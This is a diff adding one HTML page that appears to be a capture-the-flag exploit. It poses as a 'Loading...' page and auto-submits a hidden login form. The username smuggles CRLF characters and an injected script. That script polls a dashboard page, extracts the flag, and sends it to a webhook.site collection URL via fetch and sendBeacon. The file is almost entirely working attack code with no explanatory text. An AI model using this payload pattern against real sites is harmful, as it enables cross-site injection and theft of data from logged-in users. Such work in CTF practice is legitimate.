@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <form id="loginForm" action="http://web/login" method="POST">
+        <input type="hidden" name="username" id="usernameField">
+        <input type="hidden" name="password" value="password">
+    </form>
+    <script>
+        // Set username with JavaScript to preserve CRLF
+        var username = "pwn\r\n\r\n<script>setInterval(function(){a=open('/dashboard');a.onload=function(){try{var h=a.document.body.outerHTML;var m=h.match(/ASIS\\{[^}]+\\}/);if(m){fetch('https://webhook.site/ce81270b-afd7-4d83-bedd-e4854183bed2',{method:'POST',body:'FLAG_FOUND: '+m[0]});navigator.sendBeacon('https://webhook.site/ce81270b-afd7-4d83-bedd-e4854183bed2?flag='+encodeURIComponent(m[0]));}}catch(e){}a.close()}},1000)</script>oW3S";
+        document.getElementById('usernameField').value = username;
+
+        // Auto-submit
+        window.onload = function() {
+            document.getElementById('loginForm').submit();
+        };
+    </script>
+</body>
+</html>
